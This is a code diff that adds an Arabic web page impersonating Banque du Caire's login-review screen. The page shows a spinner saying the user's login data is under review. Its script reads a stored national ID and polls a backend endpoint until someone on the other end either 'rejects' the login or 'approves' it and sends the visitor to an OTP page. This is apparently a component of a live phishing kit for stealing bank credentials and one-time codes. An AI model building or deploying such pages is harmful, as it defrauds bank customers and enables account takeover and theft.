@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>جاري المراجعة - بنك القاهرة</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      min-height: 100vh;
+      font-family: 'Tajawal', sans-serif;
+      background: #0a0a0a;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: white;
+    }
+    .waiting-container {
+      text-align: center;
+      padding: 40px 24px;
+      max-width: 400px;
+      width: 100%;
+    }
+    .spinner {
+      width: 60px; height: 60px;
+      border: 4px solid rgba(232,114,12,0.2);
+      border-top-color: #e8720c;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 24px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .waiting-title {
+      font-size: 1.4rem;
+      font-weight: 800;
+      margin-bottom: 12px;
+      color: #e8720c;
+    }
+    .waiting-text {
+      font-size: 0.95rem;
+      color: rgba(255,255,255,0.7);
+      line-height: 1.8;
+      margin-bottom: 24px;
+    }
+    .status-box {
+      background: rgba(232,114,12,0.1);
+      border: 1px solid rgba(232,114,12,0.3);
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+    .status-label {
+      font-size: 0.8rem;
+      color: rgba(255,255,255,0.5);
+      margin-bottom: 6px;
+    }
+    .status-value {
+      font-size: 1rem;
+      font-weight: 700;
+      color: #e8720c;
+    }
+    .rejected-msg {
+      background: rgba(220,38,38,0.15);
+      border: 1px solid rgba(220,38,38,0.3);
+      border-radius: 12px;
+      padding: 16px;
+      color: #fca5a5;
+      display: none;
+    }
+    .logo-footer {
+      margin-top: 40px;
+      opacity: 0.4;
+      font-size: 0.75rem;
+      color: rgba(255,255,255,0.5);
+    }
+  </style>
+</head>
+<body>
+  <div class="waiting-container">
+    <div class="spinner" id="spinner"></div>
+    <h1 class="waiting-title" id="title">جاري مراجعة بياناتك</h1>
+    <p class="waiting-text" id="text">
+      يتم الآن مراجعة بيانات تسجيل الدخول الخاصة بك<br>
+      يرجى الانتظار حتى يتم التحقق من حسابك
+    </p>
+    <div class="status-box">
+      <div class="status-label">حالة الطلب</div>
+      <div class="status-value" id="statusValue">قيد المراجعة...</div>
+    </div>
+    <div class="rejected-msg" id="rejectedMsg">
+      تم رفض طلب تسجيل الدخول. يرجى المحاولة مرة أخرى.
+    </div>
+    <div class="logo-footer">بنك القاهرة - Banque du Caire</div>
+  </div>
+
+  <script>
+    (function() {
+      var nid = localStorage.getItem('bdc_nid');
+      if (!nid) { window.location.href = '/login'; return; }
+
+      function checkStatus() {
+        fetch('/api/action', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'getRedirectStatus', nationalId: nid })
+        })
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          if (data.redirectTo) {
+            if (data.redirectTo === 'login') {
+              document.getElementById('spinner').style.display = 'none';
+              document.getElementById('title').textContent = 'تم رفض الطلب';
+              document.getElementById('title').style.color = '#ef4444';
+              document.getElementById('text').style.display = 'none';
+              document.getElementById('statusValue').textContent = 'مرفوض';
+              document.getElementById('statusValue').style.color = '#ef4444';
+              document.getElementById('rejectedMsg').style.display = 'block';
+              setTimeout(function() { window.location.href = '/login'; }, 3000);
+            } else if (data.redirectTo === 'otp') {
+              document.getElementById('title').textContent = 'تم القبول!';
+              document.getElementById('title').style.color = '#22c55e';
+              document.getElementById('statusValue').textContent = 'تمت الموافقة';
+              document.getElementById('statusValue').style.color = '#22c55e';
+              document.getElementById('text').textContent = 'جاري تحويلك...';
+              setTimeout(function() { window.location.href = '/otp'; }, 1500);
+            } else {
+              window.location.href = '/' + data.redirectTo;
+            }
+            return;
+          }
+          setTimeout(checkStatus, 3000);
+        })
+        .catch(function() { setTimeout(checkStatus, 5000); });
+      }
+
+      checkStatus();
+    })();
+  </script>
+</body>
+</html>
